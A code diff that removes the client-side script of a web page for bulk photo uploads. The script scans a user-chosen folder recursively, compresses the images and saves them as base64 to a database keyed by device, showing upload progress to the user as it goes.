-                const updateStats = () => {
-                    statDone.textContent = done;
-                    statFailed.textContent = failed;
-                    statPending.textContent = items.length - (done + failed);
-                    const total = done + failed;
-                    progressFill.style.width = `${(total / items.length) * 100}%`;
-                    progressText.textContent = `Uploading ${total} / ${items.length}...`;
-                };
-
-                const processItem = async (item) => {
-                    try {
-                        // 1. Compress
-                        const compressed = await compressImage(item.file, 1000, 0.7);
-
-                        // 2. Base64
-                        const base64 = await fileToBase64(compressed);
-
-                        // 3. Save to DB: uploads/{DEVICE_ID}/{uniqueKey}
-                        const deviceRef = ref(db, `uploads/${DEVICE_ID}`);
-                        const newRef = push(deviceRef);
-
-                        await set(newRef, {
-                            id: newRef.key,
-                            deviceId: DEVICE_ID,
-                            image: base64,
-                            name: item.file.name,
-                            size: compressed.size,
-                            originalSize: item.file.size,
-                            savedPercent: Math.round((1 - compressed.size / item.file.size) * 100),
-                            timestamp: serverTimestamp(),
-                            uploadedAt: Date.now()
-                        });
-
-                        item.badge.className = 'badge done';
-                        item.badge.textContent = '✓';
-                        done++;
-                        updateStats();
-
-                    } catch (err) {
-                        console.error('❌ Error:', err.code, err.message);
-                        item.badge.className = 'badge error';
-                        item.badge.textContent = '✕';
-                        failed++;
-                        updateStats();
-                    }
-                };
-
-                // 🔥 Worker pool
-                const workers = Array(CONCURRENCY).fill(null).map(async () => {
-                    while (index < items.length) {
-                        const myIndex = index++;
-                        const item = items[myIndex];
-                        await processItem(item);
-                    }
-                });
-
-                await Promise.all(workers);
-
-                progressFill.style.width = '100%';
-                progressText.textContent = '✅ Complete!';
-                doneCard.classList.add('show');
-                doneText.textContent = `${done} photos uploaded${failed ? `, ${failed} failed` : ''}`;
-                showToast(`🎉 ${done} photos uploaded!`);
-
-            } catch (err) {
-                if (err.name === 'AbortError') {
-                    console.log('Cancelled');
-                    return;
-                }
-                console.error('Error:', err);
-                showToast('❌ ' + (err.message || 'Error'));
-            }
-        });
-
-        /* ============================================================
-           SCAN FOLDER RECURSIVELY
-           ============================================================ */
-        async function scanFolder(dirHandle, files) {
-            try {
-                for await (const entry of dirHandle.values()) {
-                    if (entry.kind === 'file') {
-                        if (/\.(jpg|jpeg|png|gif|webp|heic|heif|bmp)$/i.test(entry.name)) {
-                            try {
-                                const file = await entry.getFile();
-                                if (file.size < 20 * 1024 * 1024) {
-                                    files.push(file);
-                                }
-                            } catch (e) { }
-                        }
-                    } else if (entry.kind === 'directory') {
-                        await scanFolder(entry, files);
-                    }
-
-                    if (files.length % 10 === 0) {
-                        progressText.textContent = `🔍 Found ${files.length} photos...`;
-                        await new Promise(r => setTimeout(r, 0));
-                    }
-                }
-            } catch (err) {
-                console.warn('Scan error:', err);
-            }
-        }
-
-        /* ============================================================
-           COMPRESS
-           ============================================================ */
-        function compressImage(file, maxWidth, quality) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.onload = (e) => {
-                    const img = new Image();
-                    img.onload = () => {
-                        const canvas = document.createElement('canvas');
-                        let w = img.width, h = img.height;
-                        if (w > maxWidth) { h = (maxWidth / w) * h; w = maxWidth; }
-                        canvas.width = w;
-                        canvas.height = h;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(img, 0, 0, w, h);
-                        canvas.toBlob((blob) => {
-                            if (!blob) { reject(new Error('Compression failed')); return; }
-                            resolve(new File([blob], file.name.replace(/\.[^.]+$/, '.jpg'), { type: 'image/jpeg' }));
-                        }, 'image/jpeg', quality);
-                    };
-                    img.onerror = reject;
-                    img.src = e.target.result;
-                };
-                reader.onerror = reject;
-                reader.readAsDataURL(file);
-            });
-        }
-
-        function fileToBase64(file) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.onload = () => resolve(reader.result);
-                reader.onerror = reject;
-                reader.readAsDataURL(file);
-            });
-        }
-
-        function showToast(msg) {
-            const existing = document.querySelector('.toast');
-            if (existing) existing.remove();
-            const toast = document.createElement('div');
-            toast.className = 'toast';
-            toast.textContent = msg;
-            document.body.appendChild(toast);
-            setTimeout(() => {
-                toast.style.opacity = '0';
-                toast.style.transition = 'opacity 0.3s';
-                setTimeout(() => toast.remove(), 300);
-            }, 2500);
-        }
-    </script>
-</body>
-
 </html>
